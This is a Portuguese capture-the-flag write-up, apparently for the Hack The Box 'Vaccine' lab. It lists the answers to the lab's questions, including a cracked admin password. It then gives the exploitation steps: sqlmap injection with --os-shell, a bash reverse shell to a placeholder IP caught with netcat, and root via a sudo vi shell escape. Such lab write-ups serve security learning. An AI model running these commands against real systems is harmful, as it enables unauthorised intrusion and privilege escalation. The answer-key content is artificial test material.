# Vaccine.md

#### Tags 
`Linux` `FTP` `SQL` `SUID`

## Questões 
1. **Além de SSH e HTTP, que outro serviço está hospedado nesta caixa?**
*R:* `ftp`

2. **Este serviço pode ser configurado para permitir o login com qualquer senha para um nome de usuário específico. Qual é esse nome de usuário?**
*R:* `anonymous`

3. **Qual é o nome do arquivo baixado por meio deste serviço?**
*R:* `backup.zip`

4. **Que script vem com o conjunto de ferramentas John The Ripper e gera um hash de um arquivo zip protegido por senha em um formato para permitir tentativas de cracking?**
*R:* `zip2john`

5. **Qual é a senha para o usuário administrador no site?**
*R:* `qwerty789`

6. **Qual opção pode ser passada para o sqlmap para tentar obter a execução do comando por meio da injeção de sql?**
*R:* `--os-shell`

7. **Que programa o usuário do postgres pode executar como root usando o sudo?**
*R:* `vi`


## **Envie a flag user e root**
*Write-up:*
~~~Shell
 **Flag user:**
 sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie='PHPSESSID=ojq8sk0069d5h4uq96qr93c063' --os-shell
 nc -lvnp 4444
 bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
 find / -type f -name user.txt 2>/dev/null
   /var/lib/postgresql/user.txt
    cat /var/lib/postgresql/user.txt
    HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
    **Flag Root**
     SHELL=/bin/bash script -q /dev/null
     sudo -l
     sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
     Agora em `vi`, use o comando `:!/bin/bash`para abrir um shell como root:
      cat /root/root.txt
      HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
~~~
